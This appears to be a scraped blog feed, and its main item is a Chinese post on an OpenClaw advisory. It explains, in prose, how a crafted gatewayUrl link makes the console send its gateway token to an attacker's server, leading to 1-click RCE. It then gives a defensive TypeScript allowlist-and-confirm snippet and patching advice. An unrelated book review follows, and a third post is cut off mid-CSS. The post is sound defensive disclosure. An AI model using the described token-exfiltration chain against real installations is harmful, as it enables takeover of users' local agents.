code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多人用 OpenClaw（曾用名 Moltbot/Clawdbot）是冲着它那句隐含承诺：<strong>“本地优先，数据在自己机器上，更安全。”</strong></p>
<p>但这次事件需要你再<strong>注重注重</strong>安全了：哪怕你的网关只监听在回环地址（也就是“只在本机用”），只要用户<strong>点开一个链接</strong>，攻击链就可能从浏览器里“借道”，把你的控制权送出去。</p>
<p>这不是玄学，是官方安全公告里写得很直白的一条高危漏洞：<strong>“1-Click RCE via Authentication Token Exfiltration From gatewayUrl”</strong>，影响版本 <strong>&lt;= v2026.1.28</strong>，修复版本是 <strong>v2026.1.29</strong>。</p>
<p>官方公告：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenclaw%2Fopenclaw%2Fsecurity%2Fadvisories%2FGHSA-g8p2-7wf7-98mq" target="_blank" title="https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq" ref="nofollow noopener noreferrer">github.com/openclaw/op…</a></p>
<h2 data-id="heading-0"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb56c8b1c12d420b87b737c4fe6dd4eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930900&amp;x-signature=JBhI6AIhqrQYGncJgQcpL6menZM%3D" alt="image.png" loading="lazy"/></h2>
<h2 data-id="heading-1">这次到底炸在哪？</h2>
<p>把“配置入口”做成了“自动连接开关”</p>
<p>控制台（Control UI）做了两件看起来很“贴心”的事：</p>
<ol>
<li><strong>信任 URL 上的 <code>gatewayUrl</code> 参数</strong>（来自 query string），</li>
<li>页面加载时<strong>自动连接</strong>到这个地址，并且把本地保存的网关 token 放进 WebSocket 的 connect payload 里发出去。</li>
</ol>
<p>于是风险就变成了：</p>
<blockquote>
<p>用户只要点了一个被构造过的链接（或访问了会跳转的页面），token 就可能被送到攻击者控制的服务器。</p>
</blockquote>
<p>而 token 一旦泄露，攻击者拿到的不是“看你聊天记录”这么简单——公告里直接说，攻击者能连进受害者本地 gateway，修改配置（包括 sandbox、工具策略）o(￣▽￣)ｄ，再调用高权限动作，最终达成 <strong>1-Click RCE</strong>。</p>
<hr/>
<h2 data-id="heading-2">“我只跑在 localhost，为啥也能挨揍？</h2>
<p>很多人对“本地服务”的安全直觉是：外网访问不了，那就安全。</p>
<p>但这条链路的关键点是：<strong>外网不需要直接访问你的 localhost，只要能让“你的浏览器”去访问即可。</strong></p>
<p>安全公告里点得很清楚：即使 gateway 只绑定在 loopback，上述攻击依然能成立，因为<strong>受害者的浏览器会发起对外连接，充当桥梁</strong>。</p>
<p>这也是为什么现在越来越多的安全问题不再是“端口开没开”，而是“前端/控制台能不能被诱导执行某些网络动作”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9b38d49ddfd43a593786a540a8b6e52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930900&amp;x-signature=Cs3wzEUGvHuA%2B0vexo6SuVsFS2E%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-3">修复方案</h2>
<p>根因是 <strong>“缺少 <code>gatewayUrl</code> 校验 + 页面自动连接”</strong> 的组合。</p>
<p>修复策略也很直接：<strong>当 UI 检测到新的 gateway 地址时，要求用户确认</strong>，不再“悄悄自动连”。</p>
<p>顺带一提，OpenClaw 自己的 Security Policy 也写了警告：Web 界面是给本地用的，别绑到公网，它并没有按公网暴露去做硬化。</p>
<hr/>
<h2 data-id="heading-4">你现在该做什么？</h2>
<p><strong>如果你是用户（自托管/本地跑）：</strong></p>
<ul>
<li>立刻升级到 <strong>v2026.1.29 或更高</strong>（&lt;= v2026.1.28 都在影响范围内）。</li>
<li><strong>轮换/重置 gateway token</strong>（公告定义本质是 token 外泄风险）。</li>
<li>不要把 Control UI 暴露到公网（哪怕你觉得“我加了 token 就行”）。</li>
<li>对“看似无害的链接”保持警惕：这种漏洞最吃“点一下”。</li>
</ul>
<p><strong>如果你是做类似产品的开发者：</strong></p>
<ul>
<li>任何能从 URL/剪贴板/深链写入配置的入口，都按“外部输入”处理</li>
<li><strong>敏感 token 永远别跟着“自动连接”一起发</strong>（尤其是首次连接/地址变更时）</li>
<li>浏览器端做 allowlist/confirm；服务端也要做 origin/鉴权/最小权限</li>
</ul>
<hr/>
<h2 data-id="heading-5">给工程师的“怎么写才不踩坑”示例（防御性）</h2>
<p>下面是一个“最低配但管用”的思路：<strong>只允许 <code>wss://</code> + 固定域名白名单</strong>，其余一律弹窗确认或拒绝。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 只示意防御思路：严格校验 + 显式确认</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitizeGatewayUrl</span>(<span class="hljs-params">raw: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> u = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(raw);

    <span class="hljs-comment">// 1) 强制 wss</span>
    <span class="hljs-keyword">if</span> (u.<span class="hljs-property">protocol</span> !== <span class="hljs-string">"wss:"</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 2) 域名白名单（示例）</span>
    <span class="hljs-keyword">const</span> allowedHosts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">"gateway.example.com"</span>, <span class="hljs-string">"corp-gw.example.com"</span>]);
    <span class="hljs-keyword">if</span> (!allowedHosts.<span class="hljs-title function_">has</span>(u.<span class="hljs-property">hostname</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 3) 可选：固定端口/路径</span>
    <span class="hljs-keyword">return</span> u.<span class="hljs-title function_">toString</span>();
  } <span class="hljs-keyword">catch</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }
}

<span class="hljs-comment">// 地址变更时：必须用户确认</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">onGatewayUrlFromQuery</span>(<span class="hljs-params">raw: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> safe = <span class="hljs-title function_">sanitizeGatewayUrl</span>(raw);
  <span class="hljs-keyword">if</span> (!safe) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">const</span> ok = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">`Connect to new gateway?\n<span class="hljs-subst">${safe}</span>`</span>);
  <span class="hljs-keyword">if</span> (!ok) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 再执行保存/连接</span>
  <span class="hljs-comment">// saveSettings({ gatewayUrl: safe }); connectGateway(safe);</span>
}
</code></pre>
<p>这段代码核心原则：<strong>把“隐式自动行为”改成“显式用户决策”。</strong>
很多 1-click 事故，就是从“帮用户省一步”开始的。</p>
<hr/>
<h2 data-id="heading-6">结语</h2>
<p>OpenClaw 这类“能替你干活”的 agent，本质上握着你的消息渠道、文件、API key、甚至本机命令执行能力。权限越大，安全边界就越不能模糊。</p>
<p>这次的教训其实很统一：</p>
<ul>
<li><strong>不要信任来自 URL 的配置</strong></li>
<li><strong>不要在页面加载时自动带 token 连接陌生端点</strong></li>
<li><strong>不要把“本地监听”当成安全护身符</strong></li>
</ul>
<p>真正的安全，不是“默认没事”，而是“默认不做危险动作”，嗯。。。换句话说：宁愿不做，也不要犯错！</p>
<hr/>
<p><strong>喜欢就奖励一个“👍”和“在看”呗~</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/901baa5adb5441b388f90e0cf93b2ae9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930900&amp;x-signature=qCJUGDhhgt0B%2FPn%2BIFXHu1jahfI%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[读书分享｜两本让产品经理醍醐灌顶的好书]]></title>    <link>https://juejin.cn/post/7603186080494387251</link>    <guid>https://juejin.cn/post/7603186080494387251</guid>    <pubDate>2026-02-05T16:54:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603186080494387251" data-draft-id="7603215839582060554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="读书分享｜两本让产品经理醍醐灌顶的好书"/> <meta itemprop="keywords" content="产品经理"/> <meta itemprop="datePublished" content="2026-02-05T16:54:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="陆业聪"/> <meta itemprop="url" content="https://juejin.cn/user/13629904404157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            读书分享｜两本让产品经理醍醐灌顶的好书
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/13629904404157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    陆业聪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T16:54:02.000Z" title="Thu Feb 05 2026 16:54:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近有朋友问我有什么书推荐，想了想，这两本是我今年读过最想安利给别人的——《洞见》和《鱼不存在》。</p>
<p>据说这两本也是互联网圈不少产品大佬的私藏书单。读完之后我算是明白为什么了——<strong>做产品做久了，最容易陷入的陷阱就是"我懂用户"和"我的分类框架是对的"这两种幻觉</strong>。</p>
<hr/>
<h2 data-id="heading-0">《洞见》：佛学的科学打开方式</h2>
<p>别被"佛学"两个字吓跑。</p>
<p>这本书的作者罗伯特·赖特是进化心理学家，他干了一件很有意思的事情——用现代进化心理学和神经科学的视角，去重新审视佛学里的那些核心概念。</p>
<p>比如"无我"这个概念，听起来很玄乎对吧？</p>
<p>作者说，其实从进化心理学角度来看，我们所谓的"自我"本来就是一堆模块化的心理机制拼凑出来的幻觉。你以为是"你"在做决定，实际上可能只是某个情绪模块在那一刻占了上风而已。</p>
<p><strong>做产品的朋友们，有没有觉得这个描述特别眼熟？</strong></p>
<p>我们天天挂在嘴边的"用户心智"、"用户决策路径"，说白了不也是这么回事吗？用户以为自己在"理性选择"，实际上大部分时候只是被某个情绪、某个场景、某个瞬间的感觉推着走。那些所谓的"用户调研结论"，有多少是用户真实想法，又有多少是用户"以为自己的想法"？</p>
<p>书里还讲到，我们的大脑是自然选择设计出来让我们"存活和繁衍"的，但不是让我们"快乐"的。那些焦虑、贪婪、永不满足的感觉，都是进化留下来的"bug"。</p>
<p><strong>这不就是产品设计的底层逻辑吗？</strong> 为什么"损失厌恶"比"获得感"更有效？为什么"限时抢购"永远比"慢慢挑选"转化率高？为什么用户永远"还差一点"就满足了？——因为进化就是这么设计人脑的。</p>
<p>但这本书最打动我的地方在于：它不只是教你怎么利用这些人性弱点，而是告诉你怎么<strong>跳出这些本能反应</strong>。</p>
<p>说真的，做产品久了，我们自己也容易被数据、被KPI、被各种短期指标牵着鼻子走。PRD改了八百遍还是过不了评审的焦虑、上线后数据不及预期的崩溃、被业务方需求反复拉扯的愤怒——这些情绪其实也都是进化留给我们的"bug"。</p>
<p>冥想的本质是在训练你跟自己的感受拉开一点距离，不被那些本能反应绑架。<strong>对产品经理来说，这可能是最重要的元技能之一：保持清醒，不被情绪和数据绑架，才能做出真正好的判断。</strong></p>
<hr/>
<h2 data-id="heading-1">《鱼不存在》：一个疯狂科学家的故事，也是关于"秩序"的隐喻</h2>
<p>这本书的切入点非常奇特。</p>
<p>主角是一个叫大卫·斯塔尔·乔丹的人，19世纪末20世纪初的分类学家，斯坦福大学的创校校长。这哥们一辈子最大的热情就是给鱼分类命名——他命名了将近五分之一的已知鱼类。</p>
<p>然后1906年旧金山大地震，他毕生收集的标本全毁了，那些瓶瓶罐罐碎了一地，所有标签混在一起。换一般人可能就此崩溃放弃了。</p>
<p>但乔丹没有。他把针穿过鱼的身体，把名字直接缝在鱼身上。</p>
<p>就这个细节，震撼到我了。</p>
<p><strong>产品经理干的活，不也是这样吗？</strong></p>
<p>我们整天在做的事情，本质上就是"分类"和"命名"——给用户分层、给功能分模块、给需求分优先级、给问题贴标签。我们相信，只要分类分得足够清晰、框架搭得足够完整，就能掌控一切。</p>
<p>但书名"鱼不存在"其实来自一个颠覆性的科学结论：从进化分类学的角度，"鱼"这个类别根本不成立。我们叫做"鱼"的那些动物，彼此之间的亲缘关系可能还不如某些鱼和人类近。</p>
<p>这就很讽刺了——乔丹一辈子给鱼分类，结果"鱼"这个概念本身就是个人类发明的假象。</p>
<p><strong>做产品的时候，我们有多少"鱼"一样的假概念？</strong></p>
<p>"高端用户"真的是一个有意义的分类吗？还是我们自己为了方便而发明的标签？"社交需求"和"工具需求"真的是泾渭分明的吗？还是我们强行二分的结果？那些写在PRD里的"用户画像"，有多少是真实存在的，又有多少是我们为了让自己安心而创造的秩序幻觉？</p>
<p>更有意思的是，作者露露·米勒在写这本书的过程中，发现乔丹这个人远没有看起来那么正面——他是优生学的狂热支持者，甚至可能跟一桩命案有关。</p>
<p><strong>对"秩序"的极度执着，有时候会通向很危险的地方。</strong> 互联网行业这些年，不也有很多"分类强迫症"导致的问题吗？为了数据好看而把用户硬塞进不适合的分层、为了框架完整而砍掉不符合分类的功能、为了方法论自洽而忽视真实的复杂性——这些本质上都是"乔丹综合征"的变体。</p>
<hr/>
<h2 data-id="heading-2">为什么把这两本放一起推荐给产品经理？</h2>
<p>因为它们戳破了产品经理最容易陷入的两种幻觉：</p>
<p><strong>《洞见》戳破"自我"的幻觉</strong>——不管是用户的自我，还是我们自己的自我。理解了这一点，就不会再那么迷信用户调研的表面结论，也不会再被自己的情绪和执念牵着走。</p>
<p><strong>《鱼不存在》戳破"秩序"的幻觉</strong>——不管是用户分层、功能分类还是方法论框架。理解了这一点，就不会再把自己的分类标准当成真理，也不会再为了维护"秩序感"而忽视真实的混沌。</p>
<p>但这不是什么虚无主义的丧气话。恰恰相反，<strong>当你看清楚这些幻觉之后，反而能做出更好的产品。</strong></p>
<p>因为你不再试图用一个"完美的框架"去框住用户，而是接受用户本来就是复杂、矛盾、流动的。</p>
<p>因为你不再执着于维护一个"完整的体系"，而是愿意在混沌中找到真正重要的那几个点。</p>
<p>因为你不再被数据和KPI绑架情绪，而是能退后一步，问一问：这个指标到底在衡量什么？这个需求到底在解决什么问题？</p>
<hr/>
<p>产品经理这个岗位，说到底就是在<strong>混沌中寻找秩序，同时保持对秩序的怀疑</strong>。</p>
<p>太相信混沌，你什么都做不出来。</p>
<p>太相信秩序，你就会变成乔丹——把名字缝在一个根本不存在的分类上。</p>
<p>这两本书，一本教你看清人性的本能，一本教你警惕秩序的陷阱。</p>
<p>都不厚，周末花两天就能读完。强烈推荐给所有在互联网浪里翻滚的朋友们。</p>
<hr/>
<p>读完欢迎来找我聊聊，咱们可以一起吐槽：你做过的产品里，有多少"鱼"？</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[慢接口排查全景图：7 层定位法，快速揪出性能瓶颈]]></title>    <link>https://juejin.cn/post/7603183929252315188</link>    <guid>https://juejin.cn/post/7603183929252315188</guid>    <pubDate>2026-02-05T15:27:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603183929252315188" data-draft-id="7603043152673554447" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="慢接口排查全景图：7 层定位法，快速揪出性能瓶颈"/> <meta itemprop="keywords" content="性能优化"/> <meta itemprop="datePublished" content="2026-02-05T15:27:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            慢接口排查全景图：7 层定位法，快速揪出性能瓶颈
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T15:27:48.000Z" title="Thu Feb 05 2026 15:27:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body 